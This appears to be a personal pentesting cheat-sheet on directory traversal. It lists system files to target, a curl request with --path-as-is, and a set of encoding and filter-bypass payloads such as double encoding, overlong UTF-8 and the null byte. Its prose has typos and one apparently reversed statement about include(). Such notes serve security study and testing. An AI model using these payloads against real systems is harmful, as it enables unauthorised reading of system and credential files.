# Directory Traversal

Directory Traversal dentifiable by an ability to manipulate file paths with cli-esque: `../` or `..\` characters to change directory from the webpage beeing attacked. It is similar to [[File-Inclusion]], but does rely on `include()` 


- Directory Traversal
	- Absolute Paths - `/etc/passwd` or `C:\Windows\System32\drivers\etc\hosts`
	- Relative Paths - `../etc/passwd`; relative to position in a file system 

Provide a path that is exactly as is in the url
```bash
curl http://badwebsite/../../../../../dt/vuln --path-as-is
```


#### Traversal encoding:

Remember this is a guide to ideas of how to encode Directory Traversal, encoding payloads on the fly not from here.
```bash
../
..\
..\/
../etc/passwd\.\	# Path and dot truncation
../etc/passwd/./
%2e%2e%2f
%252e%252e%252f 	# Double encoding
%c0%ae%c0%ae%c0%af	# utf-8 encoding
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
....\
%00					# null byte
....////			# filter bypass
/%5C../%5C..

```
